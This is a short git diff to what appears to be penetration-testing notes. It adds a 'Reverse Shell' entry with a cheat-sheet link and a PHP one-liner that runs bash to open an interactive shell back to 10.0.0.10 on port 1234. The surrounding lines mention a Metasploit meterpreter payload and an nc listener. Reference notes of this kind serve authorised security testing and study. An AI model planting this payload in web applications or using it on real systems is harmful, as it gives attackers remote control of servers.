@@ -88,6 +88,10 @@ $ msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
 Meterpreter sometimes doesn't work.
 Go back to using `nc -nvlp 80` and trigger reverse shell in vulnerable app/service.
 
+Reverse Shell:
+* http://blog.safebuff.com/2016/06/19/Reverse-shell-Cheat-Sheet/
+* `<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.10/1234 0>&1'");`
+
 
 ### PRIVILEGE ESCALATION
 
